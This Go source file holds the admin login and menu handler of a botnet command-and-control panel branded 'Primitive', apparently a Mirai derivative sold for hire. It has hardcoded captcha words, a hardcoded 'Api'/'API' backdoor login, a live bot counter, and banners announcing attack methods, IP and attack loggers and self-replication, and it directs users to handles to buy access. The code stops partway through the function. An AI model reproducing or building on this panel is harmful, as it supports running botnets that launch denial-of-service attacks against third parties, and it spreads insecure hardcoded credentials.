package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get username
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte(fmt.Sprintf("\033]0; PuTTY (inactive)\007")))
	again:
	this.conn.Write([]byte("\x1b[0m"))
	captha, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if captha == "PRIME" {
		goto tos;
	}
	if captha == "adminlol" {
		goto tos;
	}
	goto again;
	tos:
    this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte(fmt.Sprintf("\033]0; Welcome to Primitive \007")))
	this.conn.Write([]byte("\x1b[1;35mlogin \x1b[1;36mor \x1b[1;35mregister\r\n"))
	this.conn.Write([]byte("\x1b[1;37m: \x1b[1;35m"))
	loginorreg, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if loginorreg == "register" {
		this.conn.Write([]byte("\x1b[1;35mUsername\x1b[1;37m:\x1b[0m "))
		new_un, err := this.ReadLine(false)
		if err != nil {
			return
		}
		this.conn.Write([]byte("\x1b[1;35mPassword\x1b[1;37m:\x1b[0m "))
		new_pw, err := this.ReadLine(false)
		if err != nil {
			return
		}
				this.conn.Write([]byte("\x1b[1;35mwaiting for admin approval \r\n"))
		fmt.Println("\x1b[35m someone is trying to register as "+ new_un +" do you approve \nyes or no: ")
		var str string
 		fmt.Scanf("%s", &str)
 		if str == "yes" {
 			goto lolyes;
 		} else {
 			return
 		}
		lolyes:
		if !database.CreateBasic(new_un, new_pw, -1, 500, 30) {
			this.conn.Write([]byte(fmt.Sprintf("\033[32m%s\033[0m\r\n", "Failed to Create New User. Unknown Error Occured.")))
		} else {
			this.conn.Write([]byte("\x1b[1;32mRegistered\033[0m\r\n"))
		}
		goto toslog;
	}
    if loginorreg == "login" {
    	goto toslog;
    } else {
    	goto tos;
    }
    toslog:
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[1;35m                 ▄▄▄·▄▄▄  \x1b[1;36m▪  • \x1b[1;35m▌ ▄ \x1b[1;36m·. ▪ \x1b[1;35m ▄▄▄▄▄\x1b[1;36m▪\x1b[1;35m   ▌ ▐\x1b[1;36m·\x1b[1;35m▄▄▄ \x1b[1;36m.\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ▐█ ▄█▀▄ █\x1b[1;36m·\x1b[1;35m██\x1b[1;36m ·\x1b[1;35m██ ▐███\x1b[1;36m▪\x1b[1;35m██\x1b[1;36m •\x1b[1;35m██  ██ \x1b[1;36m▪\x1b[1;35m█\x1b[1;36m·\x1b[1;35m█▌▀▄\x1b[1;36m.\x1b[1;35m▀\x1b[1;36m·\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                 ██▀\x1b[1;36m·\x1b[1;35m▐▀▀▄ ▐█\x1b[1;36m·\x1b[1;35m▐█ ▌▐▌▐█\x1b[1;36m·\x1b[1;35m▐█\x1b[1;36m· \x1b[1;35m▐█\x1b[1;36m.▪\x1b[1;35m▐█\x1b[1;36m·\x1b[1;35m▐█▐█\x1b[1;36m•\x1b[1;35m▐▀▀▪▄\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ▐█\x1b[1;36m▪· \x1b[1;35m▐█\x1b[1;36m•\x1b[1;35m█▌▐█▌██ ██▌▐█▌▐█▌ ▐█▌\x1b[1;36m·\x1b[1;35m▐█▌ ███ ▐█▄▄▌\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                .\x1b[1;35m▀   \x1b[1;36m.\x1b[1;35m▀  ▀▀▀▀▀▀\x1b[1;36m· \x1b[1;35m█\x1b[1;36m▪\x1b[1;35m▀▀▀▀▀▀ ▀▀▀ ▀▀▀\x1b[1;36m. \x1b[1;35m▀   ▀▀▀ \r\n"))
	this.conn.Write([]byte("\x1b[1;36m                •        •   ·      ▪ ·     ▪      ·       \r\n"))
	this.conn.Write([]byte("\x1b[1;36m                        ╔════════════════════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;36m            ╔═════════╗ ║\x1b[1;35mRULE #1\x1b[1;37m: NO SHARING     \x1b[1;36m║ ╔═════════╗\r\n"))
	this.conn.Write([]byte("\x1b[1;36m            ║\x1b[1;37m@jck.zte\x1b[1;36m ╠═╣\x1b[1;35mRULE #2\x1b[1;37m: NO SPAMMING    \x1b[1;36m╠═╣\x1b[1;37m@gme.crzy\x1b[1;36m║\r\n"))
	this.conn.Write([]byte("\x1b[1;36m            ╚═════════╝ ║\x1b[1;35mRULE #3\x1b[1;37m: NO HOLDING     \x1b[1;36m║ ╚═════════╝\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                        ╚════╦══════════════╦════╝\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                             ║ \x1b[1;37mDO U AGREE ? \x1b[1;36m║\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                             ╚═╦══════════╦═╝ \r\n"))
    this.conn.Write([]byte("\x1b[1;36m                               ║ \x1b[1;37m(\x1b[1;32myes\x1b[1;37m/\x1b[1;31mno\x1b[1;37m) \x1b[1;36m║ \x1b[0m\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                               ╚╦═══╦═════╝\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                                ╠═══╩\x1b[1;37m: \x1b[0m")) 
	tosagree, err := this.ReadLine(false)
	if err != nil {
		return
	}
	if tosagree == "yes" {
		goto login;
	}
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[1;31mAborting in [3] Seconds\r\n"))
	time.Sleep(1000 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[1;31mAborting in [2] Seconds\r\n"))
	time.Sleep(1000 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\x1b[1;31mAborting in [1] Seconds\r\n"))
	time.Sleep(1000 * time.Millisecond)
	return
	login:
	this.conn.Write([]byte("\x1b[1;36m                                ║\x1b[1;35mUsername\x1b[1;37m: \x1b[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}
	// Get password
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	motd := "Welcome to Primitive"
	this.conn.Write([]byte("\x1b[1;36m                                ║\x1b[1;35mPassword\x1b[1;37m: \x1b[1;35m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}


	if len(username) > 40 {
		this.conn.Write([]byte("\033[93m                                ║Well u tried thats, what counts. \x1b[37m"))
		time.Sleep(time.Duration(3000) * time.Millisecond)
		this.conn.Write([]byte("\033[93m                                ║Cya \x1b[37m"))
		time.Sleep(time.Duration(1000) * time.Millisecond)
		return
	}

    if len(password) > 40 {
    	this.conn.Write([]byte("STOOPIDD"))
    	time.Sleep(time.Duration(3000) * time.Millisecond) 
    	return
    }

    if len(tosagree) > 40 {
    	this.conn.Write([]byte("STOOPIDD"))
    	time.Sleep(time.Duration(3000) * time.Millisecond)
    	return
    }
 
    if len(captha) > 40 {
    	this.conn.Write([]byte("STOOPIDD"))
    	time.Sleep(time.Duration(3000) * time.Millisecond)
    	return
    }


	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte(fmt.Sprintf("\033]0; Invalid Credentials Attempt Logged! Dm @gme.crzy to buy\007")))
		this.conn.Write([]byte("\r\033[1;31mInvalid Credentials\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	} 

	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count() 
			}

			time.Sleep(time.Second)
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; Bots: %d Message: %s Username: %s AccountStatus: Active\007", BotCount, motd, username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()
	if username == "Api" && password == "API" {
		goto api;
	}
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[-]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[|]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[|]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[-]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[|]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;37mAttack methods...[RUNNING]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mAPI methods/link...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mIP-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mATTACK-logger...[ACTIVE]\r\n"))
	this.conn.Write([]byte("\x1b[1;37mSelfrep...[INACTIVE]\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;35m                ╔═╗  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╠═╝  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╩   \r\n"))	
    time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;35m                ╔═╗  ╦═╗  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╠═╝  ╠╦╝   \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╩    ╩╚═ \r\n"))		
    time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;35m                ╔═╗  ╦═╗  ╦  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╠═╝  ╠╦╝  ║   \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╩    ╩╚═  ╩  \r\n"))	
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;35m                ╔═╗  ╦═╗  ╦  ╔╦╗\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╠═╝  ╠╦╝  ║  ║║║\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╩    ╩╚═  ╩  ╩ ╩\r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;35m                ╔═╗  ╦═╗  ╦  ╔╦╗  \x1b[0m╦  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╠═╝  ╠╦╝  ║  ║║║  \x1b[0m║   \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╩    ╩╚═  ╩  ╩ ╩  \x1b[0m╩  \r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;35m                ╔═╗  ╦═╗  ╦  ╔╦╗  \x1b[0m╦  \x1b[1;36m╔╦╗ \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╠═╝  ╠╦╝  ║  ║║║  \x1b[0m║  \x1b[1;36m ║  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╩    ╩╚═  ╩  ╩ ╩  \x1b[0m╩  \x1b[1;36m ╩  \r\n"))	
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;35m                ╔═╗  ╦═╗  ╦  ╔╦╗  \x1b[0m╦  \x1b[1;36m╔╦╗  ╦  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╠═╝  ╠╦╝  ║  ║║║  \x1b[0m║  \x1b[1;36m ║   ║  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╩    ╩╚═  ╩  ╩ ╩  \x1b[0m╩  \x1b[1;36m ╩   ╩  \r\n"))	
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;35m                ╔═╗  ╦═╗  ╦  ╔╦╗  \x1b[0m╦  \x1b[1;36m╔╦╗  ╦  ╦  ╦  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╠═╝  ╠╦╝  ║  ║║║  \x1b[0m║  \x1b[1;36m ║   ║  ╚╗╔╝  \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╩    ╩╚═  ╩  ╩ ╩  \x1b[0m╩  \x1b[1;36m ╩   ╩   ╚╝   \r\n"))
	time.Sleep(400 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[1;35m                ╔═╗  ╦═╗  ╦  ╔╦╗  \x1b[0m╦  \x1b[1;36m╔╦╗  ╦  ╦  ╦  ╔═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╠═╝  ╠╦╝  ║  ║║║  \x1b[0m║  \x1b[1;36m ║   ║  ╚╗╔╝  ║╣ \r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ╩    ╩╚═  ╩  ╩ ╩  \x1b[0m╩  \x1b[1;36m ╩   ╩   ╚╝   ╚═╝\r\n"))			
	time.Sleep(4000 * time.Millisecond)
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	this.conn.Write([]byte("\x1b[0mLoading CNC... \r\n"))	
	time.Sleep(3000 * time.Millisecond)	
	api:
	this.conn.Write([]byte("\033[2J\033[1;1H"))
	v := "4.0"
	this.conn.Write([]byte("\x1b[1;35m                 ▄▄▄·▄▄▄  \x1b[1;36m▪  • \x1b[1;35m▌ ▄ \x1b[1;36m·. ▪ \x1b[1;35m ▄▄▄▄▄\x1b[1;36m▪\x1b[1;35m   ▌ ▐\x1b[1;36m·\x1b[1;35m▄▄▄ \x1b[1;36m.\r\n"))
